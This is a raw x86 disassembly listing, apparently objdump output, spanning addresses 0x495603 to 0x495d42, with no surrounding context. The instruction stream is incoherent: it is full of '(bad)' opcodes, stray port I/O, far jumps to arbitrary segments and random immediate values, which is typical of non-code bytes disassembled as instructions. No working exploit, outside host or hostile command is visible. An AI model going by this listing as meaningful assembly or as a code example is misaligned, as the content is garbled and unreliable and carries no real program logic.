  495603:	ret    
  495604:	push   0x6f
  495606:	outs   dx,DWORD PTR ds:[esi]
  495607:	mov    edx,0x8680d220
  49560c:	outs   dx,DWORD PTR ds:[esi]
  49560d:	out    0x88,eax
  49560f:	mov    DWORD PTR ds:0x3eefefc4,eax
  495615:	sbb    BYTE PTR [esi-0x3d],dl
  495618:	jg     0x4955e9
  49561a:	inc    esp
  49561b:	add    BYTE PTR [ebx+0x6d],al
  49561e:	stos   DWORD PTR es:[edi],eax
  49561f:	xor    DWORD PTR [edx+0x3f],eax
  495622:	ffreep st(0)
  495624:	sub    BYTE PTR [esi-0x4c3810aa],al
  49562a:	test   eax,0x3897c08b
  49562f:	das    
  495630:	push   esp
  495631:	jmp    0x4a5:0x17df5616
  495638:	sub    eax,0x4a43c74f
  49563d:	rol    DWORD PTR [ebp+0x43],0xcf
  495641:	or     eax,esp
  495643:	push   cs
  495644:	cwde   
  495645:	xor    DWORD PTR [edi+0x378b536a],0x67
  49564c:	lahf   
  49564d:	push   ebp
  49564e:	imul   ebp,DWORD PTR [ebx+0x3],0x97ff9fca
  495655:	adc    BYTE PTR [esi+ecx*1],dh
  495658:	mov    ds:0x6825430f,al
  49565d:	pop    edx
  49565e:	mov    ds:0x26355f7f,al
  495663:	or     al,0xb6
  495665:	sub    ah,BYTE PTR [edi-0x41]
  495668:	aas    
  495669:	xchg   edx,eax
  49566a:	(bad)  
  49566b:	mov    al,ds:0x643a7b0
  495670:	dec    esp
  495671:	fdiv   DWORD PTR [ebp-0x72dd50b5]
  495677:	sbb    eax,0x44b4ef80
  49567c:	xor    al,ch
  49567e:	test   DWORD PTR [edi],0x217045ff
  495684:	mov    esp,0xc92fd773
  495689:	adc    BYTE PTR [ecx],dl
  49568b:	les    eax,FWORD PTR [ecx+0x47]
  49568e:	xor    dh,dl
  495690:	loope  0x495634
  495692:	pop    eax
  495693:	das    
  495694:	xor    ecx,DWORD PTR [edi-0x565ecdcc]
  49569a:	pusha  
  49569b:	jg     0x4956d6
  49569d:	je     0x4956b8
  49569f:	push   eax
  4956a0:	test   al,0x2f
  4956a2:	xlat   BYTE PTR ds:[ebx]
  4956a3:	xor    eax,0xa7602018
  4956a8:	mov    ds:0x278ab6c6,al
  4956ad:	aaa    
  4956ae:	fbld   TBYTE PTR [eax+0x3f102b73]
  4956b4:	pop    es
  4956b5:	mov    ds:0xa0a21486,al
  4956ba:	out    0x9e,eax
  4956bc:	test   BYTE PTR [ebx+0x4d],bl
  4956bf:	pop    es
  4956c0:	dec    edx
  4956c1:	dec    ebx
  4956c2:	lods   eax,DWORD PTR ds:[esi]
  4956c3:	inc    eax
  4956c4:	jmp    0x97a8da4f
  4956c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4956ca:	adc    eax,0x87ff8ed2
  4956cf:	imul   eax,DWORD PTR [edx+0x701f108c],0xffffffd5
  4956d6:	sar    DWORD PTR [ebx-0x75],0x57
  4956da:	mov    bh,0xe7
  4956dc:	aaa    
  4956dd:	ins    BYTE PTR es:[edi],dx
  4956de:	pusha  
  4956df:	call   0xab7ede6a
  4956e4:	ret    0x4129
  4956e7:	lahf   
  4956e8:	sti    
  4956e9:	lahf   
  4956ea:	cs mov dh,0x15
  4956ed:	pop    eax
  4956ee:	inc    edi
  4956ef:	add    ebx,DWORD PTR [ebx-0x3f]
  4956f2:	add    DWORD PTR [ecx-0x7d],ebp
  4956f5:	iret   
  4956f6:	mov    ebp,db5
  4956f9:	ss xor al,0x41
  4956fc:	outs   dx,DWORD PTR ds:[esi]
  4956fd:	lea    esp,[eax+0x3f1f2ab1]
  495703:	dec    eax
  495704:	mov    eax,DWORD PTR [ebx]
  495706:	or     bh,bh
  495708:	sub    dl,BYTE PTR [edx+0x75]
  49570b:	jl     0x495704
  49570d:	dec    DWORD PTR [edi-0x2f6c85b5]
  495713:	(bad)  
  495714:	cmp    DWORD PTR [eax],ebx
  495716:	or     BYTE PTR [esi],dl
  495718:	add    al,0xdf
  49571a:	iret   
  49571b:	inc    esp
  49571c:	sub    eax,0x1f804ea4
  495721:	pusha  
  495722:	adc    DWORD PTR [esi+0x15],0x76c4b767
  495729:	rcr    DWORD PTR [eax-0x3a],1
  49572c:	mov    edi,0x5614a7
  495731:	and    esi,edi
  495733:	add    cl,BYTE PTR [ebx-0x55]
  495736:	call   0x3a1a:0xe88173f
  49573d:	xor    eax,0x63500077
  495742:	inc    eax
  495743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495744:	pop    eax
  495745:	test   BYTE PTR [edx],dl
  495747:	(bad)  
  495748:	mov    edx,DWORD PTR [edi-0x24d5524f]
  49574e:	pop    edi
  49574f:	push   edi
  495750:	push   eax
  495751:	inc    eax
  495752:	call   0x312bdf0d
  495757:	adc    BYTE PTR ds:0x2b128f8f,0xb2
  49575e:	mov    cl,0x3f
  495760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495762:	aad    0x0
  495764:	addr16 out 0xcc,eax
  495767:	push   esi
  495768:	stos   BYTE PTR es:[edi],al
  495769:	mov    dl,0xe7
  49576b:	ja     0x495743
  49576d:	mov    al,0xd0
  49576f:	pop    eax
  495770:	jmp    0x495791
  495772:	push   eax
  495773:	mov    DWORD PTR [ebx],ebx
  495775:	and    BYTE PTR [edi+0x4cc6e97d],cl
  49577b:	mov    edi,0x448b5722
  495780:	mov    ch,0x28
  495782:	pop    ds
  495783:	sub    cl,BYTE PTR [eax]
  495785:	lods   al,BYTE PTR ds:[esi]
  495786:	inc    esi
  495787:	or     DWORD PTR [edi],ebx
  495789:	add    eax,DWORD PTR [ebp+0x27970510]
  49578f:	push   cs
  495790:	inc    ecx
  495791:	retf   
  495792:	adc    eax,0x4d45c735
  495797:	inc    ebx
  495798:	mov    eax,ds:0x366b0acf
  49579d:	mov    BYTE PTR [edi],dl
  49579f:	lds    esp,FWORD PTR [ebp-0x53]
  4957a2:	push   es
  4957a3:	movzx  eax,WORD PTR ds:0x97693158
  4957aa:	inc    edi
  4957ab:	and    eax,0xaf892756
  4957b0:	xlat   BYTE PTR ds:[ebx]
  4957b1:	or     cl,BYTE PTR ds:0xc6775614
  4957b7:	dec    edx
  4957b8:	imul   ecx,DWORD PTR ds:0x61ac2fcf,0x11
  4957bf:	push   ecx
  4957c0:	xlat   BYTE PTR ds:[ebx]
  4957c1:	aaa    
  4957c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4957c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4957c4:	shr    BYTE PTR [ecx],1
  4957c6:	xchg   DWORD PTR [edi],ecx
  4957c8:	and    BYTE PTR [edx],al
  4957ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4957cb:	xcrypt-cbc (bad)
  4957cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4957cd:	xchg   edi,eax
  4957ce:	mov    ah,0x28
  4957d0:	add    al,0x2c
  4957d2:	scas   eax,DWORD PTR es:[edi]
  4957d3:	test   BYTE PTR [esi+0x4c],dl
  4957d6:	xchg   edx,eax
  4957d7:	push   edi
  4957d8:	xchg   ebp,eax
  4957d9:	inc    eax
  4957da:	scas   al,BYTE PTR es:[edi]
  4957db:	mov    BYTE PTR [edi+0x32],dl
  4957de:	sub    bl,BYTE PTR [ebx-0x704058a8]
  4957e4:	bound  esp,QWORD PTR [ebp+0xa57ac60]
  4957ea:	or     DWORD PTR ds:0x12174f02,ebp
  4957f0:	mov    cl,0x11
  4957f2:	les    ecx,FWORD PTR [ebx]
  4957f4:	adc    al,0xd8
  4957f6:	pop    eax
  4957f7:	push   ebp
  4957f8:	lahf   
  4957f9:	out    dx,eax
  4957fa:	sub    al,0xac
  4957fc:	jge    0x495861
  4957fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4957ff:	mov    edi,0x6105d4c1
  495804:	mov    edx,0x22af32bf
  495809:	mov    WORD PTR es:[ecx],es
  49580c:	test   DWORD PTR [ebx],0x1fd69ba3
  495812:	imul   esp,DWORD PTR [ecx-0x38f0daba],0x26b5a62b
  49581c:	scas   eax,DWORD PTR es:[edi]
  49581d:	aaa    
  49581e:	imul   ecx,ecx,0x356f1235
  495824:	or     al,0x94
  495826:	cmp    BYTE PTR [edi+ebp*8],ch
  495829:	into   
  49582a:	(bad)  
  49582b:	and    eax,0x371f468c
  495830:	and    eax,0x3784c568
  495835:	mov    DWORD PTR [edx],eax
  495837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495838:	rcl    DWORD PTR [edi-0x4a],1
  49583b:	aas    
  49583c:	jmp    0x24ab:0xa75a1560
  495843:	cmp    eax,0x4a770a94
  495848:	mov    BYTE PTR [eax],al
  49584a:	sub    al,0xf9
  49584c:	outs   dx,DWORD PTR ds:[esi]
  49584d:	inc    esi
  49584e:	scas   eax,DWORD PTR es:[edi]
  49584f:	lods   al,BYTE PTR ds:[esi]
  495850:	cwde   
  495851:	pusha  
  495852:	test   BYTE PTR [edi],dl
  495854:	add    DWORD PTR [esi],ebp
  495856:	sub    BYTE PTR [eax],al
  495858:	xlat   BYTE PTR ds:[ebx]
  495859:	aaa    
  49585a:	aas    
  49585b:	test   DWORD PTR [eax+0x2f307245],ebp
  495861:	xor    DWORD PTR [edx],ebp
  495863:	ds inc esi
  495865:	pop    es
  495866:	fisttp WORD PTR [edx]
  495868:	aad    0x3a
  49586a:	sbb    BYTE PTR [edi-0x3ab528d0],cl
  495870:	mov    ds:0x19e72274,al
  495875:	cmp    ebp,DWORD PTR [esp+ebp*8-0x11]
  495879:	pop    ds
  49587a:	test   BYTE PTR [edi-0x6898f63c],ah
  495880:	pop    ebx
  495881:	adc    eax,0x9fe7d214
  495886:	mov    ?,WORD PTR [ebx]
  495888:	adc    al,0x2a
  49588a:	mov    al,ds:0xac4f1f3f
  49588f:	es sbb al,0x34
  495892:	out    dx,eax
  495893:	scas   eax,DWORD PTR es:[edi]
  495894:	mov    ah,0x92
  495896:	(bad)  
  495897:	mov    dl,BYTE PTR [edi]
  495899:	imul   edi,DWORD PTR [ebx+0x5a],0x45
  49589d:	test   BYTE PTR [edi],ah
  49589f:	mov    edi,0xa34e03f
  4958a4:	outs   dx,BYTE PTR ds:[esi]
  4958a5:	xchg   edx,eax
  4958a6:	jg     0x49587b
  4958a8:	sub    ebx,DWORD PTR [eax-0x73]
  4958ab:	and    bh,cl
  4958ad:	pop    es
  4958ae:	push   ecx
  4958af:	cwde   
  4958b0:	sbb    al,0x4d
  4958b2:	das    
  4958b3:	xor    eax,0x75c08412
  4958b8:	das    
  4958b9:	inc    edx
  4958ba:	xchg   DWORD PTR [edx+0x57265d89],esp
  4958c0:	push   esp
  4958c1:	leave  
  4958c2:	shl    BYTE PTR [edx+0xe0a2f7f],0x90
  4958c9:	pop    eax
  4958ca:	pop    ds
  4958cb:	or     dl,dl
  4958cd:	and    eax,0x576f45eb
  4958d2:	popa   
  4958d3:	mov    ebp,0x3f429a5d
  4958d8:	jg     0x495934
  4958da:	imul   ebp,DWORD PTR [ebx],0xffffffd6
  4958dd:	nop    DWORD PTR [edi]
  4958e0:	and    dl,BYTE PTR [eax-0x2088aa5c]
  4958e6:	mov    edx,0x1e31e900
  4958eb:	inc    edi
  4958ec:	pop    ebx
  4958ed:	or     al,0xa
  4958ef:	mov    al,0x97
  4958f1:	inc    bh
  4958f3:	ins    DWORD PTR es:[edi],dx
  4958f4:	pop    eax
  4958f5:	xchg   ecx,eax
  4958f6:	inc    esi
  4958f7:	mov    bh,0x57
  4958f9:	sar    DWORD PTR [edx],cl
  4958fb:	(bad)  
  4958fc:	data16 daa 
  4958fe:	fwait
  4958ff:	inc    eax
  495900:	rol    BYTE PTR [ebp-0x5e],1
  495903:	jmp    DWORD PTR [edi+0x3521ac21]
  495909:	pop    es
  49590a:	das    
  49590b:	lea    ecx,[ebx+0x3]
  49590e:	(bad)  
  49590f:	xorps  xmm5,xmm2
  495912:	xchg   edi,eax
  495913:	sbb    BYTE PTR [edx+0x31],dl
  495916:	pop    ss
  495917:	lahf   
  495918:	cs push ss
  49591a:	(bad)  
  49591b:	pop    edx
  49591c:	push   esp
  49591d:	aaa    
  49591e:	mov    ds,WORD PTR [esi]
  495920:	add    ebp,DWORD PTR [ebx+0x359f0f53]
  495926:	pop    ss
  495927:	adc    BYTE PTR [ebx+0x16],0xf
  49592b:	pop    esi
  49592c:	jno    0x4958f8
  49592e:	ret    0xc60b
  495931:	mov    eax,cr2
  495934:	or     eax,0x6ba7330d
  495939:	les    ecx,FWORD PTR [edx]
  49593b:	sub    BYTE PTR [edi],bh
  49593d:	pop    es
  49593e:	or     esp,DWORD PTR [edx]
  495940:	call   0x76208496
  495945:	retf   0x6ac2
  495948:	out    dx,eax
  495949:	sets   BYTE PTR [ebp+eiz*1+0x3300380f]
  495951:	xlat   BYTE PTR ds:[ebx]
  495952:	sub    al,0xcc
  495954:	scas   al,BYTE PTR es:[edi]
  495955:	xchg   esp,eax
  495956:	retf   
  495957:	inc    edi
  495958:	inc    esp
  495959:	push   ecx
  49595a:	pop    ebx
  49595b:	xor    ah,BYTE PTR [ebx+0x469f4487]
  495961:	mov    ds:0x3b978406,eax
  495966:	pop    ebp
  495967:	or     eax,0x4f33808b
  49596c:	scas   eax,DWORD PTR es:[edi]
  49596d:	xor    ebp,DWORD PTR [eax+ebx*1]
  495970:	xor    DWORD PTR [esi+0x17],0xffffffcf
  495974:	xchg   edi,eax
  495975:	les    eax,FWORD PTR [edx-0x38f0b72b]
  49597b:	arpl   ax,ax
  49597d:	lods   al,BYTE PTR ds:[esi]
  49597e:	int    0x9f
  495980:	mov    edi,0xd6d1b68e
  495985:	mov    ?,WORD PTR [edi]
  495987:	fild   WORD PTR [ebp+0x58]
  49598a:	push   eax
  49598b:	adc    bl,BYTE PTR [ebx]
  49598d:	cmp    eax,edi
  49598f:	and    bl,BYTE PTR [ebp+0x62]
  495992:	xchg   ebp,eax
  495993:	xchg   edi,eax
  495994:	iret   
  495995:	pop    ds
  495996:	add    eax,0x6fc6cf84
  49599b:	xor    al,bh
  49599d:	outs   dx,BYTE PTR ds:[esi]
  49599e:	bound  eax,QWORD PTR [ecx-0x15400cee]
  4959a4:	pop    eax
  4959a5:	and    DWORD PTR ds:0x26e28f07,ebp
  4959ab:	inc    esi
  4959ac:	ret    
  4959ad:	mov    bh,0x2f
  4959af:	adc    bl,BYTE PTR [eax+0xd]
  4959b2:	les    edi,FWORD PTR [edi]
  4959b4:	int    0x84
  4959b6:	fisub  WORD PTR [esi]
  4959b8:	jg     0x49596d
  4959ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4959bb:	sub    ch,BYTE PTR [edx+0x35]
  4959be:	sbb    BYTE PTR [edi],0x67
  4959c1:	loopne 0x4959f3
  4959c3:	push   es
  4959c4:	test   BYTE PTR [edi-0x4e],bh
  4959c7:	mov    ebp,0x878ed725
  4959cc:	xor    al,0x17
  4959ce:	xor    BYTE PTR [edi+0x18],bh
  4959d1:	push   esi
  4959d2:	xor    eax,0x373817b9
  4959d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4959d8:	lods   al,BYTE PTR ds:[esi]
  4959d9:	and    dh,BYTE PTR [eax+0x2a3738e4]
  4959df:	push   esi
  4959e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4959e1:	sub    al,0x47
  4959e3:	mov    edi,0x1058594e
  4959e8:	fild   WORD PTR [edi-0x4c]
  4959eb:	push   0x2
  4959ed:	stos   DWORD PTR es:[edi],eax
  4959ee:	dec    edi
  4959ef:	cwde   
  4959f0:	or     BYTE PTR ds:0xf6e47f30,al
  4959f6:	add    cl,BYTE PTR [ebx+0x3f34c357]
  4959fc:	xor    DWORD PTR [esi-0x25],edx
  4959ff:	lods   al,BYTE PTR ds:[esi]
  495a00:	add    esi,DWORD PTR ds:0x653a3f77
  495a06:	loope  0x4959a9
  495a08:	xchg   DWORD PTR [edi+ecx*4],esi
  495a0b:	loope  0x4959e3
  495a0d:	sub    eax,0x13331f05
  495a12:	jmp    0x495a6c
  495a14:	and    eax,0xe1658fd7
  495a19:	pusha  
  495a1a:	adc    eax,0x45a9ffd7
  495a1f:	or     edi,DWORD PTR [eax]
  495a21:	ja     0x4959da
  495a23:	mov    eax,ds:0xf5630d1
  495a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495a29:	ss retf 0x6042
  495a2d:	scas   eax,DWORD PTR es:[edi]
  495a2e:	ja     0x4959bd
  495a30:	mov    dl,0xf0
  495a32:	(bad)  
  495a33:	push   edi
  495a34:	xchg   ebx,eax
  495a35:	ja     0x4959e2
  495a37:	dec    esi
  495a38:	pop    ecx
  495a39:	pop    eax
  495a3a:	ja     0x495a7d
  495a3c:	adc    al,BYTE PTR [ecx+0x330038e4]
  495a42:	scas   eax,DWORD PTR es:[edi]
  495a43:	bound  esp,QWORD PTR [edx-0x3b]
  495a46:	pop    ss
  495a47:	inc    edi
  495a48:	xor    BYTE PTR [eax],al
  495a4a:	stos   BYTE PTR es:[edi],al
  495a4b:	jp     0x495a64
  495a4d:	xchg   edx,eax
  495a4e:	ss push ss
  495a50:	pop    es
  495a51:	das    
  495a52:	pop    edx
  495a53:	popf   
  495a54:	mov    dl,0xb0
  495a56:	ja     0x495a99
  495a58:	push   0x55
  495a5a:	xor    edi,0xc42b020c
  495a60:	daa    
  495a61:	pop    ds
  495a62:	fwait
  495a63:	ss scas al,BYTE PTR es:[edi]
  495a65:	add    eax,0xe9b0070b
  495a6a:	mov    ds:0xa78f441f,al
  495a6f:	aam    0x82
  495a71:	and    al,0x17
  495a73:	cmp    BYTE PTR [edi],al
  495a75:	add    DWORD PTR [eax],0x16df8076
  495a7b:	add    al,BYTE PTR ds:0x401fa7a1
  495a81:	dec    ebx
  495a82:	scas   al,BYTE PTR es:[edi]
  495a83:	sar    DWORD PTR [edi],cl
  495a85:	inc    edx
  495a86:	dec    edx
  495a87:	xor    dl,BYTE PTR [ecx+0x61]
  495a8a:	lahf   
  495a8b:	xor    ecx,DWORD PTR [edx-0x20e297e0]
  495a91:	xchg   DWORD PTR [edi+0x23],eax
  495a94:	add    al,0xc3
  495a96:	jle    0x1baf301c
  495a9c:	daa    
  495a9d:	cwde   
  495a9e:	sub    BYTE PTR [ebx-0x49],ah
  495aa1:	jnp    0x495aca
  495aa3:	or     al,0x98
  495aa5:	and    eax,0xb410f78c
  495aaa:	sub    ch,BYTE PTR [eax]
  495aac:	push   edi
  495aad:	nop
  495aae:	adc    dh,BYTE PTR [edx+0x4d]
  495ab1:	xlat   BYTE PTR ds:[ebx]
  495ab2:	cmp    DWORD PTR [esp+eax*4],ecx
  495ab5:	fsub   DWORD PTR [edx]
  495ab7:	(bad)  
  495ab8:	mov    edi,0x7868dac0
  495abd:	and    eax,DWORD PTR [ebx-0x41]
  495ac0:	scas   eax,DWORD PTR es:[edi]
  495ac1:	pusha  
  495ac2:	ins    BYTE PTR es:[edi],dx
  495ac3:	(bad)  
  495ac4:	and    BYTE PTR [edi+0x63],al
  495ac7:	push   es
  495ac8:	or     al,0x56
  495aca:	xor    eax,0x353f3edf
  495acf:	xchg   edx,eax
  495ad0:	(bad)  
  495ad1:	mov    bh,0x57
  495ad3:	inc    ecx
  495ad4:	pop    ss
  495ad5:	mov    bl,0x80
  495ad7:	push   esp
  495ad8:	pusha  
  495ad9:	scas   eax,DWORD PTR es:[edi]
  495ada:	pop    edi
  495adb:	sub    eax,0x365c8129
  495ae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  495ae1:	fstp   TBYTE PTR [eax-0x38bbf0f8]
  495ae7:	inc    ecx
  495ae8:	xchg   edx,eax
  495ae9:	or     al,0x4
  495aeb:	add    dl,BYTE PTR [edi-0x665cb9bd]
  495af1:	add    ah,BYTE PTR [edi]
  495af3:	add    esp,DWORD PTR [edi-0x30b453eb]
  495af9:	dec    edi
  495afa:	inc    ebx
  495afb:	jecxz  0x495b27
  495afd:	xor    ah,BYTE PTR [eax-0x5df1cd99]
  495b03:	aad    0x61
  495b05:	jg     0x495b16
  495b07:	inc    edx
  495b08:	adc    eax,0x9f2481ab
  495b0d:	das    
  495b0e:	adc    bl,BYTE PTR [ecx+ebp*1-0x20bdc8ba]
  495b15:	push   edx
  495b16:	repnz xchg ebp,eax
  495b18:	xor    al,0x97
  495b1a:	xor    DWORD PTR [eax],eax
  495b1c:	xor    BYTE PTR [edi],ah
  495b1e:	lea    eax,[ebx+0x3f3f12b1]
  495b24:	add    al,BYTE PTR [edx-0x50]
  495b27:	push   eax
  495b28:	neg    DWORD PTR [edx+0x4fc8ac29]
  495b2e:	iret   
  495b2f:	test   ch,al
  495b31:	and    BYTE PTR ds:0xbbe43137,ch
  495b37:	call   0xc523:0x36d744e7
  495b3e:	add    al,0xe0
  495b40:	stos   BYTE PTR es:[edi],al
  495b41:	pop    es
  495b42:	add    al,0x8c
  495b44:	cmp    BYTE PTR [eax],al
  495b46:	shrd   DWORD PTR [esi-0x50],esi,0x98
  495b4b:	push   edi
  495b4c:	lahf   
  495b4d:	(bad)  
  495b4e:	imul   esp,DWORD PTR [esi],0x56
  495b51:	add    BYTE PTR [edi],bh
  495b53:	lahf   
  495b54:	jb     0x495b76
  495b56:	inc    edx
  495b57:	pop    esi
  495b58:	push   edi
  495b59:	fidivr WORD PTR [eax]
  495b5b:	in     al,0x88
  495b5d:	push   ebx
  495b5e:	dec    edx
  495b5f:	inc    edi
  495b60:	xor    eax,0x6160c4c
  495b65:	inc    esi
  495b66:	xchg   edi,eax
  495b67:	xor    edi,DWORD PTR [edi]
  495b69:	dec    ecx
  495b6a:	lea    esi,[esi-0x7dcce001]
  495b70:	add    DWORD PTR [edx],ebx
  495b72:	adc    al,0x17
  495b74:	jmp    DWORD PTR [ecx+0x3]
  495b77:	jne    0x495b4b
  495b79:	inc    esi
  495b7a:	lahf   
  495b7b:	pop    edx
  495b7c:	pop    eax
  495b7d:	inc    ecx
  495b7e:	mov    BYTE PTR [edi-0x39],dl
  495b81:	xchg   ebp,eax
  495b82:	mov    ah,0x80
  495b84:	jmp    0x495bf1
  495b86:	(bad)  
  495b88:	pop    esp
  495b89:	xor    BYTE PTR [eax+0x4544c758],bl
  495b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495b90:	cmp    BYTE PTR [edi+esi*8+0x55],ch
  495b94:	or     BYTE PTR [eax+0x3b],al
  495b97:	mov    edi,0xd25971cf
  495b9c:	add    BYTE PTR [edi+0x77],0x9a
  495ba0:	and    al,0x2c
  495ba2:	or     BYTE PTR [edi-0x49],cl
  495ba5:	xor    DWORD PTR [ecx+edx*8],esi
  495ba8:	mov    BYTE PTR [edi-0x3bece4bb],0x22
  495baf:	xlat   BYTE PTR ds:[ebx]
  495bb0:	xor    ebp,DWORD PTR [ebx]
  495bb2:	inc    esp
  495bb3:	or     ah,BYTE PTR [esi]
  495bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495bb6:	push   edi
  495bb7:	rol    ch,0x40
  495bba:	add    eax,DWORD PTR [edi]
  495bbc:	xor    dl,BYTE PTR [ebx-0x6092aa7f]
  495bc2:	aaa    
  495bc3:	jg     0x495bc5
  495bc5:	pop    ss
  495bc6:	sub    dl,BYTE PTR [esi+0x1f]
  495bc9:	out    0xa,al
  495bcb:	dec    eax
  495bcc:	loop   0x495b56
  495bce:	fild   WORD PTR [ebx+0x2f]
  495bd1:	sbb    BYTE PTR [eax+0x7],0x90
  495bd5:	shr    DWORD PTR [edx-0x644b1ff3],cl
  495bdb:	mov    dh,0xf
  495bdd:	in     al,0x60
  495bdf:	mov    al,0x10
  495be1:	(bad)  
  495be2:	cmp    DWORD PTR [ebp-0x4025f3fc],esi
  495be8:	push   edi
  495be9:	mov    dl,0x12
  495beb:	leave  
  495bec:	adc    eax,0xc482a336
  495bf1:	sub    ch,bh
  495bf3:	pop    es
  495bf4:	push   esi
  495bf5:	sub    BYTE PTR [eax+0x71e74a70],al
  495bfb:	fcomp  DWORD PTR [eax-0x2c]
  495bfe:	mul    DWORD PTR [edi]
  495c00:	add    al,0x2d
  495c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495c03:	adc    bh,0x16
  495c06:	lea    edx,ds:0x13ab8713
  495c0c:	les    ebp,FWORD PTR [edx-0x11]
  495c0f:	push   edi
  495c10:	push   0x574001d1
  495c15:	add    BYTE PTR [eax+ebx*1],ch
  495c18:	and    eax,0xb1a495e7
  495c1d:	cmp    BYTE PTR [edi+0x7],dl
  495c20:	gs dec edx
  495c22:	lods   eax,DWORD PTR cs:[esi]
  495c24:	push   ds
  495c25:	cmp    BYTE PTR [eax],dh
  495c27:	aam    0x20
  495c29:	push   0x49
  495c2b:	inc    esi
  495c2c:	inc    edi
  495c2d:	or     dh,BYTE PTR [ecx-0x7f]
  495c30:	les    esi,FWORD PTR ds:0x46ac1227
  495c36:	inc    edx
  495c37:	out    0xa3,eax
  495c39:	and    eax,0x6f1e1695
  495c3e:	push   ds
  495c3f:	xor    DWORD PTR [edx+0x5a],edx
  495c42:	and    eax,0x5a9a9f8c
  495c47:	mov    bl,0x56
  495c49:	inc    edi
  495c4a:	mov    bh,0x58
  495c4c:	dec    ebp
  495c4d:	add    BYTE PTR [edi+ebp*8+0x340b58d7],dh
  495c54:	adc    bh,al
  495c56:	inc    edi
  495c57:	add    al,0x11
  495c59:	mov    al,ds:0xd73257a3
  495c5e:	pop    eax
  495c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495c60:	mov    DWORD PTR [ebp+0x40abf7df],esi
  495c66:	shr    BYTE PTR [eax-0x21],1
  495c69:	pop    edi
  495c6a:	nop
  495c6b:	mov    al,ds:0x3f33a526
  495c70:	and    BYTE PTR [ebx],cl
  495c72:	jmp    0x495bf6
  495c74:	xrelease mov DWORD PTR [eax],ebx
  495c77:	sub    dl,bl
  495c79:	lahf   
  495c7a:	ja     0x495cbf
  495c7c:	sub    ch,BYTE PTR ds:0x972f2aad
  495c82:	inc    ecx
  495c83:	xor    DWORD PTR [eax],ecx
  495c85:	add    al,0xbf
  495c87:	ret    0x42a
  495c8a:	test   eax,0xad00d57f
  495c8f:	pop    ecx
  495c90:	aaa    
  495c91:	pop    es
  495c92:	xor    al,0xe2
  495c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  495c95:	test   DWORD PTR [edi],ebx
  495c97:	inc    edx
  495c98:	sub    BYTE PTR [eax],dl
  495c9a:	hlt    
  495c9b:	inc    edi
  495c9c:	pop    edi
  495c9d:	int3   
  495c9e:	aam    0xb
  495ca0:	stos   DWORD PTR es:[edi],eax
  495ca1:	mov    bh,0xe
  495ca3:	pop    ss
  495ca4:	add    DWORD PTR cs:[edi],0x56
  495ca8:	dec    edx
  495ca9:	xor    edx,DWORD PTR [edi+0xc]
  495cac:	lods   al,BYTE PTR ds:[esi]
  495cad:	mov    ds:0x30e77b4,al
  495cb2:	inc    ebx
  495cb3:	xchg   edi,edx
  495cb5:	cmp    edi,ebx
  495cb7:	dec    edx
  495cb8:	int    0xa2
  495cba:	es xor al,0x57
  495cbd:	xchg   edx,eax
  495cbe:	inc    esi
  495cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495cc0:	inc    ecx
  495cc1:	mov    bh,0x2e
  495cc3:	xor    eax,0x53a5c988
  495cc8:	push   DWORD PTR [edi]
  495cca:	xor    al,0xc5
  495ccc:	imul   esp,DWORD PTR [ebx-0x4d],0x60107f17
  495cd3:	dec    ecx
  495cd4:	repz aaa 
  495cd6:	add    BYTE PTR [eax],bh
  495cd8:	xor    eax,DWORD PTR [edi-0x51]
  495cdb:	mov    eax,ds:0xdf13626f
  495ce0:	inc    esi
  495ce1:	mov    dh,0x22
  495ce3:	sub    ah,BYTE PTR ds:0x8d606747
  495ce9:	mov    ah,0xb0
  495ceb:	daa    
  495cec:	and    BYTE PTR [eax],dl
  495cee:	sbb    ch,BYTE PTR [ecx+0x4f]
  495cf1:	mov    al,BYTE PTR [edx-0x52687bfe]
  495cf7:	or     cl,BYTE PTR [ecx]
  495cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495cfa:	out    dx,al
  495cfb:	inc    esp
  495cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495cfd:	xchg   ebx,eax
  495cfe:	and    al,0xac
  495d00:	dec    esi
  495d01:	aaa    
  495d02:	dec    DWORD PTR [ebx-0x60a9c938]
  495d08:	js     0x495d6a
  495d0a:	jno    0x495d1f
  495d0c:	xchg   esi,esi
  495d0e:	aad    0xae
  495d10:	and    dl,BYTE PTR [eax+0x27]
  495d13:	inc    ebx
  495d14:	mov    edi,0x85af68c0
  495d19:	xor    BYTE PTR [bx],bh
  495d1c:	nop
  495d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495d1e:	jne    0x495d63
  495d20:	fild   WORD PTR [esi]
  495d22:	adc    DWORD PTR [ecx+0x11d7e760],esi
  495d28:	mov    ss,WORD PTR [esi-0x79]
  495d2b:	ja     0x495d74
  495d2d:	lahf   
  495d2e:	sbb    BYTE PTR [edi],dl
  495d30:	pop    eax
  495d31:	pop    ebx
  495d32:	aaa    
  495d33:	arpl   WORD PTR [edx],dx
  495d35:	xor    BYTE PTR [edx-0x7fb8984c],cl
  495d3b:	sbb    ebx,DWORD PTR [edx]
  495d3d:	or     al,0x3f
  495d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495d40:	jo     0x495d53
  495d42:	push   ebx
